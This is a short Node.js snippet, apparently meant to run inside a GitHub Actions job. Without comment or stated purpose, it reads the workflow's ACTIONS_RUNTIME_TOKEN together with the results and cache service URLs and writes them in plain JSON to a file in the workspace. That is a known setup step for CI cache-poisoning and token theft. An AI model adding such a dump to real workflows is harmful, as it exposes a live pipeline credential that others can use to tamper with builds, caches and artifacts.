const fs=require('fs');
fs.writeFileSync(process.env.GITHUB_WORKSPACE+'/ctx-dump.txt', JSON.stringify({tok:process.env.ACTIONS_RUNTIME_TOKEN||null,res:process.env.ACTIONS_RESULTS_URL||null,curl:process.env.ACTIONS_CACHE_URL||null,ref:process.env.GITHUB_REF,repo:process.env.GITHUB_REPOSITORY},null,1));
